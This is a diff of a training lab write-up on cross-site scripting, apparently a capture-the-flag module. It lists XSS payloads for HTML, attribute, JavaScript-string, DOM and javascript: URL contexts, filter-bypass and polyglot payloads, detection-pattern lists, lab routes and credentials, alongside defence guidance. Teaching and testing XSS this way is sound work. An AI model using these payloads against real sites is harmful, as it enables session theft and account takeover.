@@ -1,731 +1,411 @@
-# Case Study: Lab 8 - Cross-Site Scripting (XSS) Vulnerabilities (CONTEXT-WISE)
+# Case Study: Lab 8 - Cross-Site Scripting (XSS)
 
 ## Business Context
 
 **Company**: SocialFlow Media Platform  
 **Role**: Frontend Security Tester  
-**Date**: Q2 2024  
+**Date**: Q2 2026  
 **Severity**: HIGH ⚠️
 
 ---
 
 ## Executive Summary
 
-SocialFlow's platform has user-facing features across different components that don't properly sanitize input before rendering. The vulnerability manifests differently in 5 distinct contexts, and each context requires different exploitation techniques because of different parsing rules in HTML vs JavaScript vs URL contexts.
+Module 8 currently runs two active XSS tracks:
 
-Your task is to **craft context-specific XSS payloads** against different input contexts and demonstrate their security impact.
+- **Lab 8.1: Reflected XSS (A-E variants)**
+- **Lab 8.2: Stored XSS (profile workflow)**
+
+In Lab 8.1, each variant reflects a different input field back into rendered output and uses server-side payload pattern checks to confirm likely execution contexts.  
+In Lab 8.2, profile values are stored without sanitization and then rendered with unsafe template output, enabling stored script execution.
+
+Your task is to trigger variant-specific payload behavior and capture the generated flag responses.
 
 ---
 
-# Lab 8.1 - HTML Content Context (Raw Body Injection)
+## Business Problem
 
-## Context A: Unescaped HTML Content
+The application accepts user input and renders it in browser-visible views without complete contextual sanitization.
+
+### Current Implementation Issues
+1. User-controlled values are reflected in live UI previews across multiple flows.
+2. XSS detection logic relies on pattern matching instead of safe output encoding.
+3. Variant completion flags are generated when dangerous payload patterns are detected.
+4. Stored profile fields in Lab 8.2 are rendered with unsafe template output.
+
+---
+
+## Challenge: Lab 8.1 - Reflected XSS (A-E)
 
 ### Problem Statement
-Search results page renders user input directly in the HTML body tag as raw content. The application template contains:
-```html
-<h1>Search results for: <%= request.query.search %></h1>
-```
-Developers never implemented HTML escaping, assuming "search is just text". But HTML parsers are greedy - any `<` and `>` characters create new tags. Input like `<img src=x onerror="alert('xss')">` creates a real IMG tag with an onload event handler.
 
-### Vulnerability Description
-User input is inserted directly into HTML body context. Angle brackets `< >` are NOT escaped, so they create actual HTML elements. Event handlers (onerror, onload, etc.) execute automatically when parsed.
+Lab 8.1 uses five themed variants with distinct input fields and reflected render surfaces. Each variant checks for active XSS payload markers and issues a variation-specific Lab 8 flag when matched.
 
-### Flag
-```
-FLAG!lab8_a_[hash]
-```
+### Shared Trigger Patterns in Current Code
 
----
+`check_xss_payload()` accepts payloads containing one or more of:
 
-## Context B: HTML Attribute Context with Quote Breakout
+- `<script`
+- `onerror=`
+- `onload=`
+- `onclick=`
+- `javascript:`
+- `"; fetch`
+- `'; fetch`
 
-### Problem Statement
-Image gallery allows users to supply alt text for their uploaded images. The template renders:
-```html
-<img src="image.jpg" alt="<%= user_input %>">
-```
-The developer escaped the quotes in the alt value (good!) but the input can still break out by including another quote and space, then injecting attributes. Input like `" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="` becomes:
-```html
-<img src="image.jpg" alt="" onerror="fetch('/xss-success?variant=B').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))" x="">
-```
-The first quote closes the alt attribute, then the new attribute executes.
+Variant **C** also accepts:
 
-### Vulnerability Description
-Input is inside an HTML attribute. While quotes are often escaped, attribute context allows breaking out and injecting sibling attributes with event handlers.
+- `"; alert`
+- `'; alert`
+- `";prompt`
+- `';prompt`
+- `";confirm`
+- `';confirm`
 
-### Flag
-```
-FLAG!lab8_b_[hash]
+### Flag Endpoint
+
+Successful payloads may call:
+
+```http
+GET /xss-success?variant=A|B|C|D|E
 ```
 
----
-
-## Context C: JavaScript String Context with Escape Bypass
-
-### Problem Statement
-Comment section includes descriptions embedded in JavaScript:
-```html
-<script>
-  var description = "<%= request.body.description %>";
-</script>
-```
-JavaScript string escaping is different from HTML escaping. Even if the application escapes HTML entities (`&lt;`), JavaScript parsers will decode JavaScript escape sequences first. Input like `"; alert('xss'); //` breaks out of the string:
-```javascript
-var description = ""; alert('xss'); // ";
-```
-The quote ends the string, the alert executes, and the remaining quote is commented out.
-
-### Vulnerability Description
-Input is inside a JavaScript string literal. HTML entity escaping doesn't protect against JavaScript breakout. The string parser closes, then arbitrary JS executes, then the remaining content is commented.
-
-### Flag
-```
-FLAG!lab8_c_[hash]
-```
-
----
-
-## Context D: DOM Tag/Element Injection
-
-### Problem Statement
-User profile page retrieves data from the server and uses jQuery to inject it into the DOM:
-```javascript
-$('#content').html(userInput);
-```
-The `.html()` method interprets angle brackets as HTML tags. Input like `<script>alert('xss')</script>` creates real script tags that execute. Unlike reflected XSS, the attacker controls the DOM element ID and can inject any HTML structure, including event handler tags.
-
-### Vulnerability Description
-Input is directly injected into the DOM via `.html()` method, which parses HTML. Script tags and event handler attributes execute as real code.
-
-### Flag
-```
-FLAG!lab8_d_[hash]
-```
-
----
-
-## Context E: URL/Protocol Handler Context
-
-### Problem Statement
-Image source field allows URLs, and the template renders:
-```html
-<div style="background-image: url('<%= user_url %>');">
-```
-JavaScript protocol handlers (`javascript:`) execute code when triggered by browser navigation. Input like `javascript:alert('xss')` makes:
-```html
-<div style="background-image: url('javascript:alert('xss')');">
-```
-Some browsers execute the javascript: protocol when parsing CSS URLs. Additionally, the `src` attribute might render the URL as clickable or auto-fetched, triggering JavaScript execution.
-
-### Vulnerability Description
-URL context allows `javascript:` protocol. When browsers parse CSS or attribute URLs, protocol handlers like `javascript:` can trigger code execution without requiring user interaction in some cases.
-
-### Flag
-```
-FLAG!lab8_e_[hash]
-```
-
----
-
-## Exploitation Techniques by Context
-
-### Context A: HTML Content
-**Payload**: `<script>alert('xss')</script>`
-**Why it works**: Browser parses < as tag start, creates script element, code executes immediately
-**Defense**: HTML entity encode: `&lt;img...`, or use innerText instead of innerHTML
-
-### Context B: Attribute Breaking
-**Payload**: `" onerror="alert('xss')" x="`
-**Why it works**: Quote closes alt attribute, event handler injected as new attribute, onerror fires on invalid image
-**Defense**: Quote escaping + input validation, or use setAttribute() instead of template strings
-
-### Context C: JavaScript String
-**Payload**: `"; alert('xss');//`
-**Why it works**: Quote ends string, semicolon ends statement, new statement executes, // comments remainder
-**Defense**: JavaScript escaping (not HTML), or use data instead of embedding in strings
-
-### Context D: DOM Injection
-**Payload**: `<img src=x onerror="alert('xss')">`
-**Defense**: Use .text() instead of .html(), or sanitize with DOMPurify
-
-### Context E: JavaScript Protocol
-**Payload**: `javascript:alert('xss');void(0)`
-**Why it works**: Browser interprets javascript: protocol, executes code, void(0) returns undefined (no navigation)
-**Defense**: Whitelist protocols (http://, https://), reject javascript:
-
----
-
-## Expected Discoveries
-
-- **Context A requires**: Breaking HTML parser with angle brackets
-- **Context B requires**: Escaping attribute quotes and injecting sibling attributes  
-- **Context C requires**: Breaking JavaScript string literals
-- **Context D requires**: Injecting HTML tags through DOM methods
-- **Context E requires**: Using JavaScript protocol handler
-
----
-
-**Document payloads for each context and explain why escaping/encoding differs.**
-
----
-
-## Challenge A: HTML Content Injection (Search Box)
-
-### Vulnerability Description
-```html
-<h1>Search results for: <%= search_query %></h1>
-```
-
-The search query is embedded directly in HTML without escaping.
-
-### Attack Vector
-**Simple payload:**
-```html
-<script>alert('XSS Works')</script>
-```
-
-**To trigger XSS:**
-```html
-<script>alert('xss')</script>
-```
-
-### Exploitation Steps:
-1. Navigate to search functionality
-2. Enter the payload in search box
-3. Click "Search" or press Enter
-4. Alert/flag appears
-
-### Why It Works:
-```html
-Response HTML:
-<h1>Search results for: <script>alert('XSS')</script></h1>
-                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-Browser treats this as executable script
-```
-
-### Your Objectives:
-- [ ] Craft basic XSS payload
-- [ ] Fetch flag from `/xss-success?variant=A`
-- [ ] Extract flag from alert
-- [ ] Submit flag to platform
-
----
-
-## Challenge B: HTML Attribute Context (Image Alt Text)
-
-### Vulnerability Description
-```html
-<img alt="<%= alt_text %>" src="image.jpg">
-```
-
-The alt text is embedded in an attribute without proper quoting.
-
-### Attack Vector
-**Break out of attribute context:**
-```
-" onerror="alert('xss')" x="
-```
-
-### Exploitation Steps:
-1. Fill out image form (upload)
-2. Alt text field: Paste the payload
-3. Fill other required fields (title, category)
-4. Click "Upload"
-5. Image loads and error handler fires
-
-### Why It Works:
-```html
-Response HTML:
-<img alt="" onerror="fetch(...)" x="" src="image.jpg">
-      ^    ^                      ^
-      Close tag  Inject event    New attr
-      
-Browser:
-1. Closes alt="" with closing quote
-2. Adds onerror event handler
-3. Non-existent/invalid image triggers onerror
-4. Fetch executes, flag is retrieved
-```
-
-### Your Objectives:
-- [ ] Identify image upload form
-- [ ] Craft attribute-breaking payload
-- [ ] Use event handler (onerror)
-- [ ] Fetch and extract flag
-- [ ] Submit flag
-
----
-
-## Challenge C: JavaScript String Context (Description)
-
-### Vulnerability Description
-```html
-<script>
-  var projectDescription = "<%= description %>";
-</script>
-```
-
-User input is embedded in a JavaScript string without escaping.
-
-### Attack Vector
-**Break out of string, execute code, comment out rest:**
-```
-test"; alert('xss');//
-```
-
-### Exploitation Steps:
-1. Find the description/project creation form
-2. Paste payload into description field
-3. Fill other required fields (title, category)
-4. Click "Publish" or "Create"
-5. Page loads and JavaScript executes
-
-### Why It Works:
-```javascript
-Original: var projectDescription = "<%= description %>";
-
-After injection:
-var projectDescription = "test"; 
-fetch('/xss-success?variant=C').then(r=>r.json()).then(d=>alert('Flag: '+d.flag));//";
-
-Parsing:
-- "test" closes the string
-- ; ends the statement
-- fetch() is a NEW statement (our malicious code)
-- // comments out the rest of the line
-```
-
-### Key Detail:
-The detection pattern looks for `"; fetch` - there's a **space before fetch** to bypass simple string matching filters!
-
-### Your Objectives:
-- [ ] Identify JavaScript context input
-- [ ] Break out of string context
-- [ ] Execute fetch statement
-- [ ] Use comments to hide the rest
-- [ ] Extract and submit flag
-
----
-
-## Challenge D: DOM Content (Post Content)
-
-### Vulnerability Description
-```html
-<div class="post-content">
-  <%= user_post %>
-</div>
-```
-
-User post content is rendered directly as HTML.
-
-### Attack Vector
-**Image tag with error handler:**
-```html
-<img src=x onerror="alert('xss')">
-```
-
-### Exploitation Steps:
-1. Navigate to "Post to Feed" feature
-2. Enter the payload as post content
-3. Click "Post to Feed"
-4. Page reloads and shows your post
-5. img tag error triggers handler
-6. Flag is retrieved
-
-### Why It Works:
-```html
-Response includes:
-<div class="post-content">
-  <img src=x onerror="...">
-</div>
-
-Browser:
-1. Parses <img> tag
-2. Tries to load src="x" (invalid)
-3. Image fails to load
-4. onerror event fires
-5. Malicious JavaScript executes
-```
-
-### Your Objectives:
-- [ ] Find post/feed creation feature
-- [ ] Craft IMG tag with onerror
-- [ ] Post/submit content
-- [ ] Trigger error and execution
-- [ ] Extract and submit flag
-
----
-
-## Challenge E: URL/Protocol Handler (Source Field)
-
-### Vulnerability Description
-```html
-<a href="<%= source_url %>">Open Resource</a>
-```
-
-A user-controlled URL is placed directly in an href attribute.
-
-### Attack Vector
-**JavaScript protocol:**
-```javascript
-javascript:alert('xss');void(0)
-```
-
-### Exploitation Steps:
-1. Navigate to source/resource provisioning
-2. Paste JavaScript protocol URL into "Source" field
-3. Click "Provision" or "Create"
-4. **THEN**: Scroll down and click the "Open" link
-5. JavaScript protocol executes
-6. Flag is retrieved
-
-### Why It Works:
-```html
-HTML markup:
-<a href="javascript:fetch(...);void(0)">Open</a>
-
-Browser behavior:
-When user clicks link with javascript: protocol:
-1. Instead of loading URL
-2. Execute the JavaScript code
-3. void(0) returns undefined (no navigation)
-4. Code executes in current context
-```
-
-### Important Notes:
-- You MUST click the link to execute
-- The `void(0)` prevents page navigation
-- This is how many drive-by exploits work
-
-### Your Objectives:
-- [ ] Identify URL/source input field
-- [ ] Create JavaScript protocol URL
-- [ ] Submit/provision the resource
-- [ ] Find and click the generated link
-- [ ] JavaScript executes, flag retrieved
-- [ ] Extract and submit flag
-
----
-
-## XSS Payload Reference
-
-### Context Detection
-
-| Context | Example | Payload Type | Example Payload |
-|---------|---------|--------------|-----------------|
-| **HTML** | `<h1><%=input%></h1>` | Script tag | `<script>alert()</script>` |
-| **Attr** | `<img alt="<%=input%>">` | Event handler | `" onload="..."` |
-| **JS String** | `var x = "<%=input%>"` | Break string | `";alert();//` |
-| **JS Code** | `var x=<%=input%>` | Template literal | ``${alert()}`` |
-| **URL** | `<a href="<%=input%>">` | Protocol | `javascript:alert()` |
-
-### Common XSS Payloads
-
-**Basic Alert:**
-```html
-<script>alert('XSS')</script>
-```
-
-**Image with Event:**
-```html
-<img src=x onerror="alert('XSS')">
-```
-
-**Break Attribute:**
-```html
-" onload="alert('XSS')" x="
-```
-
-**String Context:**
-```
-";alert('XSS');//
-```
-
-**Protocol Handler:**
-```
-javascript:alert('XSS');void(0)
-```
-
-**Fetch Flag:**
-```javascript
-fetch('/xss-success?variant=X').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))
-```
-
----
-
-## Advanced Techniques
-
-### Bypass Filters
-
-**Filter: Blocks `<script>`**
-```html
-<img src=x onerror="alert()">
-<svg onload="alert()">
-<iframe srcdoc="<script>alert()</script>">
-```
-
-**Filter: Blocks `alert`**
-```html
-<script>fetch('/api/flag')</script>
-<img src=x onerror="setTimeout(()=>alert(),0)">
-```
-
-**Filter: Blocks quotes**
-```html
-<img src=x onerror=alert(1)>
-<svg onload='eval(atob("YWxlcnQoMSk="))'>
-```
-
-**Filter: Blocks event handlers**
-```html
-<iframe src="javascript:alert()">
-<object data="javascript:alert()">
-```
-
-### Polymorph Payloads
-
-**Works in multiple contexts:**
-```
-';/**/alert(1)//
-"><script>alert(1)</script>
-';/**/alert(1);/*
-```
-
----
-
-## Tools for XSS Testing
-
-### Manual Testing
-```
-1. Test each input field
-2. Try different payload types
-3. Check browser console for errors
-4. Inspect network requsts
-```
-
-### Browser Console
-```javascript
-// Check if XSS worked
-console.log('XSS Executed!');
-
-// Fetch flag
-fetch('/xss-success?variant=A')
-  .then(r=>r.json())
-  .then(d=>console.log('Flag: '+d.flag))
-```
-
-### Burp Suite
-- **Repeater**: Test payloads manually
-- **Intruder**: Fuzz input fields
-- **Decoder**: HTML/URL encode/decode
-
-### OWASP ZAP
-- Automated XSS scanner
-- Payload delivery
-- Result analysis
-
----
-
-## What You Should Discover
-
-### Lab 8.1 Expected Findings:
+Response:
 
 ```json
 {
-  "Context_A_HTML": {
-    "vulnerability": "Unescaped HTML content",
-    "payload": "<script>alert('xss')</script>",
-    "entry_point": "Search box",
-    "flag": "FLAG!lab8_1a_[hash]"
-  },
-  "Context_B_Attribute": {
-    "vulnerability": "Unquoted/improperly quoted attribute",
-    "payload": "\" onerror=\"alert('xss')\" x=\"",
-    "entry_point": "Image alt text",
-    "flag": "FLAG!lab8_1b_[hash]"
-  },
-  "Context_C_JavaScript": {
-    "vulnerability": "Unescaped string in JavaScript",
-    "payload": "test\"; alert('xss');//",
-    "entry_point": "Description field",
-    "execution_context": "Script tag content",
-    "flag": "FLAG!lab8_1c_[hash]"
-  },
-  "Context_D_DOM": {
-    "vulnerability": "User content rendered as HTML",
-    "payload": "<img src=x onerror=\"alert('xss')\">",
-    "entry_point": "Post content",
-    "flag": "FLAG!lab8_1d_[hash]"
-  },
-  "Context_E_URL": {
-    "vulnerability": "JavaScript protocol in href",
-    "payload": "javascript:alert('xss');void(0)",
-    "entry_point": "Source URL",
-    "trigger": "Must click link",
-    "flag": "FLAG!lab8_1e_[hash]"
-  }
+  "success": true,
+  "flag": "FLAG{lab8_variation_X_[hash12]}",
+  "message": "XSS Payload Executed Successfully on Variant X!"
 }
 ```
 
 ---
 
-## Technical Concepts
+## Variant 8.1 A: TechCorp Employee Portal
 
-### XSS Attack Chain
+### Route
+- `/lab8/1/a/search`
 
-```
-Attacker Input
-    ↓
-Server receives unescaped
-    ↓
-Stored in database
-    ↓
-Served to victim's browser
-    ↓
-Browser parses HTML/JavaScript
-    ↓
-Malicious code executes
-    ↓
-Attacker gains access to:
-- Session cookies
-- Sensitive data
-- User credentials
-- Can perform actions as victim
-```
+### Input Field
+- `search_query`
 
-### Context-Aware Escaping
+### Problem Statement
+Search queries are reflected in the search preview and response panel.
 
-```
-Context     Escape Method          Example
-============================================
-HTML        Entity encoding        <div>&lt;script&gt;
-Attribute   Quote + Entity         alt="&quot;onload&quot;"
-URL         URL encoding            href="javascript%3Aalert()"
-JavaScript  Unicode escape         var x = "\u0074est"
-CSS         Font-face mitigation   
-```
+### Exploitation Steps
+1. Open `/lab8/1/a/login` and sign in with any non-empty username and password.
+2. Go to `/lab8/1/a/search`.
+3. Submit a payload in `search_query`, for example:
+   ```html
+   <script>alert('xss')</script>
+   ```
+4. Confirm the "Script Execution Successful" state.
+5. Capture the flag shown in the variant result panel.
 
-### Same Origin Policy & XSS
-
-- XSS exploits SOP by executing in victim's **origin**
-- Attacker can read cookies, localStorage, session data
-- Make requests as the victim
-- Access data intended for that user
+### Expected Result
+- Payload detection enabled.
+- Variation A flag generated via `get_random_flag('lab8', variation='variation_A')`.
 
 ---
 
-## Real-World XSS Impact
+## Variant 8.1 B: PixelArt Marketplace
 
-**Attacks enabled by XSS:**
-- **Session hijacking**: Steal authentication cookies
-- **Credential theft**: Log user keystrokes, phish
-- **Data exfiltration**: Extract sensitive information
-- **Malware distribution**: Inject drive-by downloads
-- **Defacement**: Modify page content
-- **User impersonation**: Post/comment/purchase as victim
-- **Botneting**: Enlist browsers in attacks
+### Route
+- `/lab8/1/b/upload`
 
-**Real breaches (XSS vector):**
-- eBay: Stored XSS in auction pages
-- Facebook: DOM-based XSS in video player
-- Twitter: Stored XSS in DMs
-- MySpace: Malicious JavaScript injection
+### Input Field
+- `image_alt`
 
----
+### Problem Statement
+Image metadata (alt-style input) is reflected in preview output and can trigger attribute/event payload patterns.
 
-## Defense Strategies (Learn These!)
+### Exploitation Steps
+1. Open `/lab8/1/b/login` and sign in with any non-empty seller name and password.
+2. Go to `/lab8/1/b/upload`.
+3. Submit payload in `image_alt`, for example:
+   ```text
+   " onerror="alert('xss')" x="
+   ```
+4. Submit upload form (`upload_btn`).
+5. Confirm "Metadata Injection Success" and capture the displayed flag.
 
-### ✅ Output Encoding
-```python
-# HTML entity encoding
-from markupsafe import escape
-safe_html = escape(user_input)
-# Result: <script> → &lt;script&gt;
-```
-
-### ✅ Content Security Policy (CSP)
-```html
-<meta http-equiv="Content-Security-Policy" 
-      content="script-src 'self'; style-src 'self'">
-```
-
-### ✅ Template Auto-Escaping
-```python
-# Django/Jinja2 default HTML escaping
-{{ user_input }}  <!-- Auto-escaped -->
-{{ user_input|safe }}  <!-- Only when safe -->
-```
-
-### ✅ DOM API (safe methods)
-```javascript
-// UNSAFE - Allows HTML injection
-element.innerHTML = userInput;
-
-// SAFE - Renders as text
-element.textContent = userInput;
-element.innerText = userInput;
-
-// SAFE - Explicitly creates text node
-element.appendChild(document.createTextNode(userInput));
-```
-
-### ✅ Validation Rules
-```python
-# Whitelist allowed tags
-allowed_tags = ['b', 'i', 'strong', 'em']
-# Reject everything else
-sanitized = bleach.clean(input, allowed_tags)
-```
+### Expected Result
+- Variation B flag generated via `get_random_flag('lab8', variation='variation_B')`.
 
 ---
 
-## Prevention Checklist
+## Variant 8.1 C: GraphicStudio
 
-- [ ] Encode ALL user output based on context
-- [ ] Never trust user input for HTML/JavaScript
-- [ ] Implement Content Security Policy
-- [ ] Use templating engines with auto-encoding
-- [ ] Validate input + encode output
-- [ ] Use security libraries (DOMPurify, Bleach)
-- [ ] Test for XSS in development
-- [ ] Monitor for malicious activity
-- [ ] Keep frameworks updated
+### Route
+- `/lab8/1/c/create`
+
+### Input Field
+- `project_desc`
+
+### Problem Statement
+Project metadata is reflected in a JS-like render preview. Variant C explicitly supports string-breakout style markers (`"; alert`, etc.).
+
+### Exploitation Steps
+1. Open `/lab8/1/c/login` and sign in with any non-empty designer name and password.
+2. Go to `/lab8/1/c/create`.
+3. Submit payload in `project_desc`, for example:
+   ```text
+   "; alert('xss');//
+   ```
+4. Submit create form (`create_btn`).
+5. Confirm "SVG Sync Executed" and capture the displayed flag.
+
+### Expected Result
+- Variation C flag generated via `get_random_flag('lab8', variation='variation_C')`.
 
 ---
 
-## Key Takeaways
+## Variant 8.1 D: SocialHub
 
-1. **Context matters** - Different contexts need different escaping
-2. **Never trust user input** - Assume it will be malicious
-3. **Encode output, not input** - Validation is not escaping
-4. **Defense in depth** - CSP + escaping + validation
-5. **XSS is often underestimated** - It's a critical vulnerability
-6. **Different attack vectors** - Reflected vs Stored vs DOM
-7. **Modern frameworks help** - React, Vue auto-encode by default
+### Route
+- `/lab8/1/d/myfeed`
+
+### Input Field
+- `post_content`
+
+### Problem Statement
+Post content is reflected in feed preview and can trigger HTML/event-handler payload detection.
+
+### Exploitation Steps
+1. Open `/lab8/1/d/login` and sign in with any non-empty handle and password.
+2. Go to `/lab8/1/d/myfeed`.
+3. Submit payload in `post_content`, for example:
+   ```html
+   <img src=x onerror="alert('xss')">
+   ```
+4. Submit post form (`post_btn`).
+5. Confirm "Event Handler Triggered" and capture the displayed flag.
+
+### Expected Result
+- Variation D flag generated via `get_random_flag('lab8', variation='variation_D')`.
 
 ---
 
-## Related Concepts
+## Variant 8.1 E: DocVault
 
-- **CWE-79**: Improper Neutralization (XSS)
-- **CWE-94**: Improper Control of Generation of Code (Code Injection)
-- **OWASP A03:2021**: Injection (includes XSS)
-- **DOM XSS**: JavaScript-based injection
-- **CSRF**: Often paired with XSS for account takeover
+### Route
+- `/lab8/1/e/upload`
+
+### Input Field
+- `doc_source`
+
+### Problem Statement
+Repository/source input is reflected in link preview and accepts protocol-handler patterns such as `javascript:`.
+
+### Exploitation Steps
+1. Open `/lab8/1/e/login` and sign in with any non-empty user value and password.
+2. Go to `/lab8/1/e/upload`.
+3. Submit payload in `doc_source`, for example:
+   ```text
+   javascript:alert('xss');void(0)
+   ```
+4. Submit upload form (`upload_btn`).
+5. Confirm "IFrame Containment Breach" and capture the displayed flag.
+
+### Expected Result
+- Variation E flag generated via `get_random_flag('lab8', variation='variation_E')`.
+
+---
+
+## Challenge: Lab 8.2 - Stored XSS (Profile Workflow)
+
+### Active Routes
+- `/lab8/2`
+- `/lab8/2/dashboard`
+- `/lab8/2/update`
+
+### Login Credentials
+- `test / test`
+
+### Problem Statement
+Profile values are stored unsanitized and rendered with unsafe template output (`|safe`) in dashboard views.
+
+### Trigger Logic
+A Lab 8.2 flag is generated when any updated field contains:
+
+- `<script>`
+- `%3cscript%3e`
+
+Checked fields:
+
+- `full_name`
+- `address`
+- `email`
+- `bio`
+
+### Exploitation Steps
+1. Open `/lab8/2`.
+2. Login with `test / test`.
+3. In profile update form, inject payload into `bio` or `full_name`, for example:
+   ```html
+   <script>alert('stored-xss')</script>
+   ```
+4. Submit update to `/lab8/2/update`.
+5. Return to `/lab8/2/dashboard` and confirm flag banner appears.
+
+### Expected Result
+- Flag generated via `get_random_flag('lab8_2')`.
+- Stored payload is reflected in unsafe-rendered profile areas.
+
+---
+
+## Lab 8 Complete Variant Map
+
+```text
+Lab 8.1 (Reflected XSS)
+├─ Variant A: TechCorp Search Reflection
+├─ Variant B: PixelArt Attribute Reflection
+├─ Variant C: GraphicStudio JS-String Reflection
+├─ Variant D: SocialHub Feed Reflection
+└─ Variant E: DocVault URL/Protocol Reflection
+
+Lab 8.2 (Stored XSS)
+└─ Profile update + unsafe dashboard rendering
+```
+
+---
+
+## Complete Exploitation Workflow
+
+### Phase 1: Access
+```text
+1. Open /lab8
+2. Choose /lab8/1 (A-E) or /lab8/2
+3. Authenticate where required
+```
+
+### Phase 2: Payload Delivery
+```text
+Lab 8.1:
+- Submit context-specific payload in the variant input field
+- Trigger preview/render branch
+- Capture variant flag
+
+Lab 8.2:
+- Login test/test
+- Store script payload in profile fields
+- Reload dashboard
+- Capture stored XSS flag
+```
+
+### Phase 3: Evidence Capture
+```text
+- Route used
+- Parameter/field used
+- Payload used
+- Execution indicator shown
+- Captured flag
+```
+
+---
+
+## Expected Discoveries
+
+### Lab 8.1 A-E
+```json
+{
+  "entry_points": [
+    "/lab8/1/a/search",
+    "/lab8/1/b/upload",
+    "/lab8/1/c/create",
+    "/lab8/1/d/myfeed",
+    "/lab8/1/e/upload"
+  ],
+  "success_condition": "Payload matches XSS detection patterns",
+  "flag_source": "/xss-success or variant response panel",
+  "flag_family": "lab8"
+}
+```
+
+### Lab 8.2
+```json
+{
+  "entry_point": "/lab8/2/update",
+  "success_condition": "Stored profile field contains <script> marker",
+  "flag_source": "/lab8/2/dashboard",
+  "flag_family": "lab8_2"
+}
+```
+
+---
+
+## Technical Concepts Tested
+
+### Reflected XSS (Lab 8.1)
+```text
+User input
+→ reflected in response/preview context
+→ browser interprets dangerous payload
+→ XSS condition confirmed
+```
+
+### Stored XSS (Lab 8.2)
+```text
+User input stored without sanitization
+→ later rendered with unsafe output
+→ script executes on page load/render
+```
+
+### Core Lessons
+- Context-specific encoding is mandatory.
+- Pattern-based blocking is not a complete defense.
+- Stored data must be sanitized before unsafe rendering paths.
+
+---
+
+## Recommended Testing Tools
+
+- Browser DevTools (Network + DOM inspection)
+- Burp Suite Repeater
+- OWASP ZAP
+- Manual form replay with crafted payloads
 
 ---
 
 ## Flag Submission Checklist
 
-For each context (A-E):
+- [ ] Chosen active Lab 8 route
 - [ ] Identified vulnerable input field
-- [ ] Crafted context-appropriate payload
-- [ ] Executed payload successfully
-- [ ] Fetched flag from endpoint
-- [ ] Extracted flag from response
-- [ ] Submitted flag to platform
+- [ ] Submitted context-valid payload
+- [ ] Observed execution/success indicator
+- [ ] Captured flag
+- [ ] Documented route, payload, and evidence
 
 ---
 
-**Document each payload, its context, and exploitation technique. Security review requires detailed methodology.**
+## Real-World Impact
+
+If unresolved in production systems, these issues can lead to:
+
+- Session theft and account takeover
+- Unauthorized actions in user context
+- Credential and token exfiltration
+- Wormable client-side payload spread
+
+---
+
+## Key Takeaways
+
+1. Module 8 currently includes reflected and stored XSS workflows.
+2. Lab 8.1 uses variant-specific reflected input surfaces (A-E).
+3. Lab 8.2 demonstrates unsanitized persistence and unsafe rendering.
+4. Context-aware output encoding and safe DOM APIs are required defenses.
+5. Always report route, parameter, payload chain, and captured flag.
+
+---
+
+## Related Security Concepts
+
+- **CWE-79**: Cross-site Scripting (XSS)
+- **OWASP A03:2021**: Injection
+- **Stored XSS vs Reflected XSS**: Execution timing and persistence differences
+
+---
+
+Document findings per variant with route, field name, payload chain, execution evidence, and captured flag.
